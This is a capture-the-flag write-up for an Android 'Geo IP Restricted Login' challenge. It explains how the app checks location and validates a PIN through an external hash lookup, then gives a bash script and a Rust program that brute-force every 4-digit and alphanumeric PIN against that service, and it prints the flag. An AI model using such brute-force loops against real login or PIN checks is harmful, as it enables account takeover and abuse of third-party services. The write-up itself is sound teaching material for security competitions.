# Geo IP Restricted Login - Android

> Author : jul0105
> Date : 12.04.2021



## Challenge info

**Release** : Bundle 4 (10.04)

**Difficulty** : Medium

**Goal** : You must login into the app to get the flag. But be aware, the login is restricted to people located in Zermatt (CH) only. As the app trust all people in Zermatt, a 4 digit PIN will do.



## Static analysis

1. This application request the following URL to get GeoIP informations : https://ipinfo.io/json. Here are the important informations returned :

```json
{
  "region": "Vaud",
  "country": "CH",
}
```

In our case, we want the region to be "Zermatt" to be able to login. (Note: I blocked a long time on this thinking that the valid string should be "Valais". Thankfully, I saw the clarification on Discord.)



2. The actual PIN is checked with an external service. A request is made to `ja3er.com` with the following format :

```
https://ja3er.com/img/<hash>
Where <hash> is MD5(CH.Zermatt.<PIN>)
```

If the hash is valid, a string is given by the service. This string is our flag.



## Solving

Since the PIN is only 4-digit long, it is easily bruteforcable. I made this simple bash script that test the 10'000 possibles PIN : 

```bash
#!/bin/bash

# Setup reference output
curl "https://ja3er.com/img/$(printf "CH.Zermatt.%04d" 0000 | md5sum | cut --bytes=-32)" > output 2> /dev/null

# Loop over 4 digit PIN
for i in {0..9999}
do
    printf "CH.Zermatt.%04d\n" $i
    
    # Get response from external service
    curl "https://ja3er.com/img/$(printf "CH.Zermatt.%04d" $i | md5sum | cut --bytes=-32)" > output2 2> /dev/null
    
    # Compare response with reference. If different, it might be the valid PIN
    diff output output2
done
```

And here we found that the PIN is `2021` and the Flag is :

```
SCS21{R3wire-Your-Br@in-Cr@ck-The-Ch@lleng3s}
```





## Appendix

For reference, I also made a very dirty rust program (way faster than bash) to solve this challenge because I initially thought that the PIN could be alphanumerical :

```rust
use md5;
use rayon::prelude::*;

lazy_static::lazy_static! {
     static ref CHARSET: [char; 62] = [
         'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
         'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
         'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
         'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
     ];
}

fn main() {
    println!("Starting...");
    let a: Vec<i32> = (0..(CHARSET.len() as i32).pow(4)).into_par_iter()
        .filter(|x| test_pin(convert_to_pin(x).as_str())).collect();

    println!("{:?}", a)
}

fn convert_to_pin(num: &i32) -> String {
    let charset_size: i32 = CHARSET.len() as i32;

    format!("{}{}{}{}",
                    CHARSET[((num % charset_size.pow(4)) / charset_size.pow(3)) as usize],
                    CHARSET[((num % charset_size.pow(3)) / charset_size.pow(2)) as usize],
                    CHARSET[((num % charset_size.pow(2)) / charset_size) as usize],
                    CHARSET[(num % charset_size) as usize]
    )
}

fn test_pin(pin: &str) -> bool {
    let str: String = format!("CH.Zermatt.{}", pin);
    let digest = md5::compute(str);
    let url: String = format!("https://ja3er.com/img/{:?}", digest); // TODO /search/ or /img/

    let res = reqwest::blocking::get(&url).unwrap();

    let s = String::from_utf8(res.bytes().unwrap().to_ascii_lowercase()).unwrap();

    match  s.find("sorry the requested file could not be found on this server.") {
        Some(27278) => false,
        Some(_) => {
            println!("[+] PIN: {} -> {}", pin, url);
            true
        },
        None => {
            println!("[+] PIN: {} -> {}", pin, url);
            true
        },
    }
}
```

Cargo.toml :

```toml
[package]
name = "Solve"
version = "0.1.0"
authors = ["jul0105 <>"]
edition = "2018"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
md5 = "0.7.0"
reqwest = { version = "0.11.2", features = ["blocking"] }
rayon = "1.5.0"
lazy_static = "1.4.0"
```

